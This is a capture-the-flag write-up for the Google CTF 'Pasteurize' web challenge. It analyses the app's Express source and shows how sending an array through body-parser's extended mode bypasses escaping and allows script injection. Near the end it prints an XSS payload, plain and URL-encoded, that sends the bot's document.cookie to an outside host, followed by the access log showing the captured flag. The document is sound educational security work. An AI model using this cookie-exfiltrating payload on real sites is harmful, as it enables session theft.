# Google CTF - Web - Pasteurize
Team RamRod

![](Google%20CTF-Web-Pasteurize/3588036D-BF65-4A4F-8B27-CAD6C6838173.png)

Challenge URL: https://pasteurize.web.ctfcompetition.com/

## Basic App Functions
### Create new Paste
![](Google%20CTF-Web-Pasteurize/62E7EA84-E60C-4266-959E-D8FAC14DB891.png)

### View your Paste
![](Google%20CTF-Web-Pasteurize/93AEFC71-72F9-43C4-8BDE-1EAAFF482461.png)

### Share with TJMike (AKA this is what triggers server side XSS)
![](Google%20CTF-Web-Pasteurize/4EFE62F3-372E-4F6B-A5C3-B5CDC5321159.png)


## Source Code Discovery
Viewing the HTML source code there is some hints here. Also leading to believe that the XSS is not something that will happen on the client, because it is using DOMpurify to sanitize content in the browser too. I am heavily leaning that the XSS is server side (see details that follow in my source code analysis)
![](Google%20CTF-Web-Pasteurize/7F18AA05-48E1-4FBE-8D03-C3BB1E20E6D7.png)

So byte 1337 in /source can lead to XSS?

While in main page if you view the HTML source, there is a hidden hyperlink to `/source` 
![](Google%20CTF-Web-Pasteurize/98C0F5CF-5976-412E-A197-ED7D6D40FF6C.png)

Retrieved Source Code
```
const express = require('express');
const bodyParser = require('body-parser');
const utils = require('./utils');
const Recaptcha = require('express-recaptcha').RecaptchaV3;
const uuidv4 = require('uuid').v4;
const Datastore = require('@google-cloud/datastore').Datastore;

/* Just reCAPTCHA stuff. */
const CAPTCHA_SITE_KEY = process.env.CAPTCHA_SITE_KEY || 'site-key';
const CAPTCHA_SECRET_KEY = process.env.CAPTCHA_SECRET_KEY || 'secret-key';
console.log("Captcha(%s, %s)", CAPTCHA_SECRET_KEY, CAPTCHA_SITE_KEY);
const recaptcha = new Recaptcha(CAPTCHA_SITE_KEY, CAPTCHA_SECRET_KEY, {
  'hl': 'en',
  callback: 'captcha_cb'
});

/* Choo Choo! */
const app = express();
app.set('view engine', 'ejs');
app.set('strict routing', true);
app.use(utils.domains_mw);
app.use('/static', express.static('static', {
  etag: true,
  maxAge: 300 * 1000,
}));

/* They say reCAPTCHA needs those. But does it? */
app.use(bodyParser.urlencoded({
  extended: true
}));

/* Just a datastore. I would be surprised if it's fragile. */
class Database {
  constructor() {
    this._db = new Datastore({
      namespace: 'littlethings'
    });
  }
  add_note(note_id, content) {
    const note = {
      note_id: note_id,
      owner: 'guest',
      content: content,
      public: 1,
      created: Date.now()
    }
    return this._db.save({
      key: this._db.key(['Note', note_id]),
      data: note,
      excludeFromIndexes: ['content']
    });
  }
  async get_note(note_id) {
    const key = this._db.key(['Note', note_id]);
    let note;
    try {
      note = await this._db.get(key);
    } catch (e) {
      console.error(e);
      return null;
    }
    if (!note || note.length < 1) {
      return null;
    }
    note = note[0];
    if (note === undefined || note.public !== 1) {
      return null;
    }
    return note;
  }
}

const DB = new Database();

/* Who wants a slice? */
const escape_string = unsafe => JSON.stringify(unsafe).slice(1, -1)
  .replace(/</g, '\\x3C').replace(/>/g, '\\x3E');

/* o/ */
app.get('/', (req, res) => {
  res.render('index');
});

/* \o/ [x] */
app.post('/', async (req, res) => {
  const note = req.body.content;
  if (!note) {
    return res.status(500).send("Nothing to add");
  }
  if (note.length > 2000) {
    res.status(500);
    return res.send("The note is too big");
  }

  const note_id = uuidv4();
  try {
    const result = await DB.add_note(note_id, note);
    if (!result) {
      res.status(500);
      console.error(result);
      return res.send("Something went wrong...");
    }
  } catch (err) {
    res.status(500);
    console.error(err);
    return res.send("Something went wrong...");
  }
  await utils.sleep(500);
  return res.redirect(`/${note_id}`);
});

/* Make sure to properly escape the note! */
app.get('/:id([a-f0-9\-]{36})', recaptcha.middleware.render, utils.cache_mw, async (req, res) => {
  const note_id = req.params.id;
  const note = await DB.get_note(note_id);

  if (note == null) {
    return res.status(404).send("Paste not found or access has been denied.");
  }

  const unsafe_content = note.content;
  const safe_content = escape_string(unsafe_content);

  res.render('note_public', {
    content: safe_content,
    id: note_id,
    captcha: res.recaptcha
  });
});

/* Share your pastes with TJMike🎤 */
app.post('/report/:id([a-f0-9\-]{36})', recaptcha.middleware.verify, (req, res) => {
  const id = req.params.id;

  /* No robots please! */
  if (req.recaptcha.error) {
    console.error(req.recaptcha.error);
    return res.redirect(`/${id}?msg=Something+wrong+with+Captcha+:(`);
  }

  /* Make TJMike visit the paste */
  utils.visit(id, req);

  res.redirect(`/${id}?msg=TJMike🎤+will+appreciate+your+paste+shortly.`);
});

/* This is my source I was telling you about! */
app.get('/source', (req, res) => {
  res.set("Content-type", "text/plain; charset=utf-8");
  res.sendFile(__filename);
});

/* Let it begin! */
const PORT = process.env.PORT || 8080;

app.listen(PORT, () => {
  console.log(`App listening on port ${PORT}`);
  console.log('Press Ctrl+C to quit.');
});

module.exports = app;
```

## Source Code White Box Analysis
### b/1337 
Is this the 1337 char in the file? I dont know but the code is not that big so doesnt really matter. Need to review the whole thing. However maybe need to pay close attention to the Database class and functions...
![](Google%20CTF-Web-Pasteurize/D3E46394-6999-402F-9229-0BF2D903395A.png)

### Source Code Comments
![](Google%20CTF-Web-Pasteurize/A4E7D8DD-62B3-4AAC-9DE3-9C01606B18AA.png)

The body parser is clearly there for a reason setting extended mode to true. Looking up [body-parser  -  npm](https://www.npmjs.com/package/body-parser) you can see that they define the following:

**extended**
The extended option allows to choose between parsing the URL-encoded data with the querystring library (when false) or the qs library (when true). The "extended" syntax allows for rich objects and arrays to be encoded into the URL-encoded format, allowing for a JSON-like experience with URL-encoded. For more information, please  [see the qs library](https://www.npmjs.org/package/qs#readme) .

[qs  -  npm](https://www.npmjs.com/package/qs#readme)
**qs** allows you to create nested objects within your query strings, by surrounding the name of sub-keys with square brackets []. For example, the string 'foo[bar]=baz' converts to:

Moving on I have not reviewed what is happening with the datastore stuff. Given enough time, I would like to replicate this web app and use a google cloud datastore (maybe they have a free version?) and see that the data looks like in the database and stuff. I know the packages used (import statements at top of code) and shouldn't be difficult to set up a clone of this web application for use with debugging.

Note. I dont know about the "./Utils" package though... since that seems custom. However just setting up a simple datastore would be possible to learn WTF is going on here.

![](Google%20CTF-Web-Pasteurize/1506D673-78B2-48A3-A0E7-C95879431DDC.png)

Only thing that stood out to me was that note[0] area. Because if the body-parsing extended mode is enabled that means we can send arrays. Might be something to review

This part is performing a simple replace of `<` and `>` and replacing it with its safe hex equivalent. Boo content filtering :(
![](Google%20CTF-Web-Pasteurize/23077F33-C645-4DC3-B78D-C3274DAFDEF0.png)

Interesting that there is not any sanitization storing user controlled input directly into the database. 
![](Google%20CTF-Web-Pasteurize/A451D7D6-10D6-4594-AF71-F0F934415718.png)

Sanitization occurs **after** the database content is retrieved, and sanitized before showing you in the browser.
![](Google%20CTF-Web-Pasteurize/02964E9D-8967-4560-80D6-E85427F91988.png)

But is there any sanitization on this server side request when a POST request is made? I don't think so. This is a notable area to trigger XSS if we find the right payload... Basically you make a POST request to /report/<UUID> of your "paste" (hopefully with a staged XSS as content), and then the backend will use the utils package to "visit" the link, triggering server side XSS.

![](Google%20CTF-Web-Pasteurize/0F9557AF-109B-4860-8288-CE47F531D284.png)


## Dynamic Analysis
### Make a regular paste
![](Google%20CTF-Web-Pasteurize/6F7CB89A-A687-48E8-BAD1-D27B2285BB36.png)

Redirects and shows the "note" value as what I sent. "Hello World"
![](Google%20CTF-Web-Pasteurize/37F10A72-87FD-4455-A83D-8E90D8516AB5.png)

### Send known-bad chars
![](Google%20CTF-Web-Pasteurize/3A2993B9-BCDF-41F8-9219-81028452B045.png)

Properly sanitized as expected from the source code analysis
![](Google%20CTF-Web-Pasteurize/BD94D2D2-F018-41E9-B710-4AE4AEB882AC.png)


### Send multiple params
![](Google%20CTF-Web-Pasteurize/999A7254-05F5-463C-90A8-ED0DE941D69A.png)

Looks like Node will concatenate the params using a `,` as delimiter
![](Google%20CTF-Web-Pasteurize/31080354-14B6-4A8C-AB0D-9CB8920D2CF1.png)

### Sending an array
This is where it gets interesting 🧟

![](Google%20CTF-Web-Pasteurize/6DFB9D89-AEC6-44CC-8C35-025ECFC4CECB.png)

Well now we have a proper object here in our response
![](Google%20CTF-Web-Pasteurize/80AC4C29-ABF6-4909-86F5-09226EDC2415.png)


### Send an array with bad chars
![](Google%20CTF-Web-Pasteurize/26CEA92D-41DE-4983-BB0A-654B7D7F418F.png)

Our content is still filtered because as mentioned in the source code, the response content view GET request (via the redirect) runs through that sanitization filter. But what about the server side POST request
![](Google%20CTF-Web-Pasteurize/8DE195C8-6D8A-4AAD-A2F1-9A7401E92DEF.png)

### Trying again with a simple alert XSS
![](Google%20CTF-Web-Pasteurize/B53B9DD3-E8A1-4839-8667-2A3E448CF19B.png)

![](Google%20CTF-Web-Pasteurize/57CFC3D6-CC8D-424B-8C39-233112F942E3.png)

Viewing in browser and shared with TJMike but nothing triggered. No bueno.
![](Google%20CTF-Web-Pasteurize/05883043-4775-427D-A798-F59739068460.png)

## Javascript Code Injection
If you send an array (allowed because bodyparser extended is enabled) and then close out the javascript command with `;` you can write your own JS!
![](Google%20CTF-Web-Pasteurize/CA1AE518-A30F-4647-B259-2E5BC07956F8.png)

![](Google%20CTF-Web-Pasteurize/E6CB41CA-9E7D-4246-AA60-778484147034.png)



### We have XSS!
Testing with a simple `console.log("hacked")` payload
![](Google%20CTF-Web-Pasteurize/F91D4305-FE65-49D7-B2B5-28C609568828.png)
![](Google%20CTF-Web-Pasteurize/6022E8FA-00C0-4450-9B8A-5E16C16A42C7.png)

You can see the message comes through so we now have javascript execution.
![](Google%20CTF-Web-Pasteurize/45AA159A-7F89-4AA7-BF99-72479EF1165D.png)

But this is still coming from my client.

As noted in the source code, you need to issue a POST request with a valid reCapcha to have TJMike retrieve the contents server-side.

Javscript Payload
`content[]=;location='http://m-verify.com/hacked?flag='+document.cookie;//`

URL encode it
`content[]=%3b%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%6d%2d%76%65%72%69%66%79%2e%63%6f%6d%2f%68%61%63%6b%65%64%3f%66%6c%61%67%3d%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3b%2f%2f`

POST the paste
![](Google%20CTF-Web-Pasteurize/4F8DBAEB-F27B-4E89-9A76-F7539A17AFBF.png)

You can see our new javascript line on 64 in the response is staged
![](Google%20CTF-Web-Pasteurize/1A91DE5D-AA76-4A1D-853D-BE79200CDE1D.png)

Now to let TJMike know whats going on. Need to make sure the UUID is from our staged paste, and that the `g-recaptcha-response` is valid
![](Google%20CTF-Web-Pasteurize/8033BA51-1D09-47EF-8591-796E0233C37C.png)

TJMike liked our paste..

Now to tail our access log on the webserver

`104.155.55.51 - - [24/Aug/2020:06:18:28 -0700] "GET /hacked?flag=secret=CTF{Express_t0_Tr0ubl3s} HTTP/1.1" 404 516 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4182.0 Safari/537.36"`

# Flag
`CTF{Express_t0_Tr0ubl3s}`
 
![](Google%20CTF-Web-Pasteurize/317FC5F3-D74F-467A-BD9B-B8BD2EF9BD96.png)

Hope you enjoyed

-D4rkm0de
